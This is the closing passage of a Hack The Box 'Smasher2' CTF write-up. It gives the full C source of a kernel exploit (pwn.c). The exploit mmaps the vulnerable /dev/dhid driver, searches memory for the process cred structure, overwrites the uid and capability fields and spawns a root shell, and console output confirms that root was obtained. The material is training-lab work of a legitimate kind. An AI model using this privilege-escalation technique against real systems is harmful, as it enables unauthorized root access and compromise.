class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">stop</span> = getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$ .&#x2F;pwn </span><br><span class="line">[+] PID: 4773</span><br><span class="line">[*] Open OK fd: 3</span><br><span class="line">[*] mmap OK address: 42424000</span><br><span class="line">[*] Current UID: 1000</span><br><span class="line">[*] Cred structure found! ptr: 0x76186484, crednum: 1</span><br><span class="line">[*] Cred structure found! ptr: 0x76186904, crednum: 2</span><br><span class="line">[*] Cred structure found! ptr: 0x76186b44, crednum: 3</span><br><span class="line">[*] Cred structure found! ptr: 0x76186cc4, crednum: 4</span><br><span class="line">[*] Cred structure found! ptr: 0x76186fc4, crednum: 5</span><br><span class="line">[*] Cred structure found! ptr: 0x76187684, crednum: 6</span><br><span class="line">[*] Cred structure found! ptr: 0x76187bc4, crednum: 7</span><br><span class="line">[*] Cred structure found! ptr: 0x77112184, crednum: 8</span><br><span class="line">[*] Cred structure found! ptr: 0x771123c4, crednum: 9</span><br><span class="line">[*] Cred structure found! ptr: 0x77112484, crednum: 10</span><br><span class="line">[*] Cred structure found! ptr: 0x771129c4, crednum: 11</span><br><span class="line">[*] Cred structure found! ptr: 0x77113084, crednum: 12</span><br><span class="line">[*] Cred structure found! ptr: 0x77113144, crednum: 13</span><br><span class="line">[*] Cred structure found! ptr: 0x77113504, crednum: 14</span><br><span class="line">[*] Cred structure found! ptr: 0x77113c84, crednum: 15</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a484, crednum: 16</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a604, crednum: 17</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a6c4, crednum: 18</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a844, crednum: 19</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a9c4, crednum: 20</span><br><span class="line">[*] Cred structure found! ptr: 0x7714aa84, crednum: 21</span><br><span class="line">[*] Cred structure found! ptr: 0x7714ac04, crednum: 22</span><br><span class="line">[*] Cred structure found! ptr: 0x7714ad84, crednum: 23</span><br><span class="line">[*] Process cred structure found ptr: 0x7714ad84, crednum: 23</span><br><span class="line"></span><br><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure>
<p>Great! now what’s left to do is to overwrite the capabilities in our <code>cred</code> structure with <code>0xffffffffffffffff</code> and execute <code>/bin/sh</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">credIt += <span class="number">1</span>; </span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"-"</span>, (<span class="keyword">char</span> *)<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p><code>pwn.c</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;                                                         </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;                                                      </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;                                                              </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * <span class="keyword">const</span> * argv)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\033[93m[+] PID: %d\n"</span>, getpid());</span><br><span class="line">	<span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/dhid"</span>, O_RDWR);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\033[93m[!] Open failed!\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\033[32m[*] Open OK fd: %d\n"</span>, fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span> = <span class="number">0xf0000000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> mmapStart = <span class="number">0x42424000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> * addr = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)mmap((<span class="keyword">void</span>*)mmapStart, <span class="built_in">size</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (addr == MAP_FAILED)&#123;</span><br><span class="line">		perror(<span class="string">"\033[93m[!] Failed to mmap !"</span>);</span><br><span class="line">		<span class="built_in">close</span>(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\033[32m[*] mmap OK address: %lx\n"</span>, addr);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> uid = getuid();</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\033[93m[+] Searching for the process cred structure ..."</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> credIt = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> credNum = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr) &lt; (mmapStart + <span class="built_in">size</span> - <span class="number">0x40</span>))&#123;</span><br><span class="line">		credIt = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid &amp;&amp;</span><br><span class="line">			addr[credIt++] == uid</span><br><span class="line">			)&#123;</span><br><span class="line">				credNum++;</span><br><span class="line">				</span><br><span class="line">				credIt = <span class="number">0</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">			<span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">			</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"\033[32m[*] Cred structure found ! ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"\033[32m[*] Got Root"</span>);</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"\033[32m[+] Spawning a shell"</span>);</span><br><span class="line"></span><br><span class="line">				credIt += <span class="number">1</span>; </span><br><span class="line">				addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">				addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">				execl(<span class="string">"/bin/sh"</span>,<span class="string">"-"</span>, (<span class="keyword">char</span> *)<span class="literal">NULL</span>);</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"\033[93m[!] Execl failed..."</span>);</span><br><span class="line">			</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				</span><br><span class="line">				credIt = <span class="number">0</span>;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">				addr[credIt++] = uid;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	addr++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And finally:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$ .&#x2F;pwn </span><br><span class="line">[+] PID: 1153</span><br><span class="line">[*] Open OK fd: 3</span><br><span class="line">[*] mmap OK address: 42424000</span><br><span class="line">[+] Searching for the process cred structure ...</span><br><span class="line">[*] Cred structure found ! ptr: 0xb60ad084, crednum: 20</span><br><span class="line">[*] Got Root</span><br><span class="line">[+] Spawning a shell</span><br><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)</span><br><span class="line">#</span><br></pre></td></tr></table></figure>

<p><img src="/images/hackthebox/smasher2/12.png" alt=""><br>We owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/wall/">Hack The Box - Wall</a><br>Next Hack The Box write-up : <a href="/hack-the-box/craft/">Hack The Box - Craft</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-12-14</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/c/" rel="tag">#c</a> <a class="tag-link" href="/tags/code-analysis/" rel="tag">#code-analysis</a> <a class="tag-link" href="/tags/kernel-exploitation/" rel="tag">#kernel-exploitation</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/mmap/" rel="tag">#mmap</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/reverse-engineering/" rel="tag">#reverse-engineering</a> <a class="tag-link" href="/tags/waf/" rel="tag">#waf</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
